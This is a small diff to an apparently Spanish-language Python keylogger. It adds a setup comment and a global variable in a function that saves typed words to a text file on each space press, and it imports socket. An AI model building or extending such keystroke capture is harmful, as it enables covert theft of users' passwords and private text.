@@ -4,8 +4,9 @@ import socket
 import os
 # import datetime  # Deseable si quiero saber cuando las pulsó
 
-""" 
+# SE DEBEN INSTALAR LOS PAQUETES MEDIANTE UN ENTORNO VIRTUAL
 
+""" 
 NOTAS IMPORTANTES
 
 Al desarrollar este programa dentro de un wsl, windows no permite que este tengo acceso a lo que se teclea en windows
@@ -37,6 +38,7 @@ def guardar_palabra(tecla_pulsada):
     match (tecla_pulsada):
         case 'space':
             with open('palabras.txt', 'a') as file:
+                global palabra
                 file.write(palabra + '\n')
                 reset_palabra()
 
